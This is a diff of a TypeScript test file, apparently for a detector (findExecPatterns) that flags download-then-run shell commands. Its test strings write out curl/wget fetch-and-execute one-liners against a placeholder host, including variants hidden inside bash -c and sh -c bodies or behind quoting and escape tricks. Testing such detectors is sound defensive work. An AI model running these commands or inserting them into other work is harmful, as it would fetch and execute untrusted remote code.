@@ -158,10 +158,12 @@ describe("Vercel review of the performance commit", () => {
   });
   it("01M81HBH284HKWT0GEWW9E0R55: an escaped \\> before & is a literal, so the & still separates", () => {
     expect(findExecPatterns("echo curl \\>& wget https://x.invalid/i.sh && sh i.sh").map((h) => h.rule)).toContain("download-then-run");
-    expect(findExecPatterns("curl x \\\\>& wget https://x.invalid/i.sh && sh i.sh").map((h) => h.rule)).not.toContain("download-then-run");
   });
   it("01M81HKWG8PMBSDPD6CXAYQZDW: separators inside quotes do not split a command", () => {
     for (const t of ['curl -H "X: a\\>&b" -o /tmp/a https://x.invalid && sh /tmp/a', "curl -H 'X: a;b|c&d' -o /tmp/a https://x.invalid && sh /tmp/a"]) expect(findExecPatterns(t).map((h) => h.rule), t).toContain("download-then-run");
+  });
+  it("01M81HWRT5611WTCF243Z3PVG2: inside a quoted shell body, a download belongs to the nearest downloader", () => {
+    for (const t of ['bash -c "curl -s https://x.invalid/ok; wget https://x.invalid/i.sh; sh i.sh"', "sh -c 'curl https://x.invalid; wget https://x.invalid/i.sh && bash i.sh'"]) expect(findExecPatterns(t).map((h) => h.rule), t).toContain("download-then-run");
   });
   it("an unclosed quote ends at the line, so it cannot hide the lines after it", () => {
     expect(findExecPatterns('echo "unclosed\ncurl -o /tmp/a https://x.invalid && sh /tmp/a').map((h) => h.rule)).toContain("download-then-run");
